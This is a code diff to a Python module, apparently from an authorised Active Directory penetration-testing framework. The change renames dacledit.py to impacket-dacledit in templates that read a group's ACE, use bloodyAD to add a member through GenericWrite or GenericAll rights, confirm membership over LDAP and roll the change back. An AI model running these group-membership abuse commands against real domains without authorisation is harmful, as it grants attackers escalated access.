@@ -10,7 +10,7 @@ Self-Membership/GenericWrite/GenericAll over a group adds a member, PROVEN by
 a positive ``memberOf`` LDAP read-back (never the ``add groupMember`` call's
 own exit code):
 
-    dacledit.py -action read  (confirm the PRECONDITION ACE, over the GROUP)
+    impacket-dacledit -action read  (confirm the PRECONDITION ACE, over the GROUP)
     bloodyAD ... add groupMember '<group>' '<member>'
     nxc ldap --query "(sAMAccountName=<member>)" memberOf  (POSITIVE confirmation)
     ROLLBACK: bloodyAD ... remove groupMember ...; re-read memberOf;
@@ -20,7 +20,7 @@ Non-destructive (not irreversible, not code-exec): no destructive-confirm gate.
 Mutating: yes (group membership changes), so a VERIFIED rollback is required.
 
 ``verified_recipe=False`` (recipe-known, not lab-proven). UNVERIFIED: the exact
-bloodyAD/dacledit.py human-readable wording (see ``acl_common.py``'s module
+bloodyAD/impacket-dacledit human-readable wording (see ``acl_common.py``'s module
 docstring and this module's own markers below).
 """
 from __future__ import annotations
@@ -146,7 +146,7 @@ class AddMemberExecutor(ValidationExecutor):
         v = values(params)
         dc = ctx.config.dc_ip
         return [
-            f"dacledit.py -action read -target '{v['group']}' -dc-ip {dc} <auth>  "
+            f"impacket-dacledit -action read -target '{v['group']}' -dc-ip {dc} <auth>  "
             "(confirm precondition ACE over the group)",
             f"bloodyAD ... --host {dc} add groupMember '{v['group']}' '{v['member']}'",
             f"nxc ldap {dc} <auth> --query \"(sAMAccountName={v['member']})\" memberOf  "
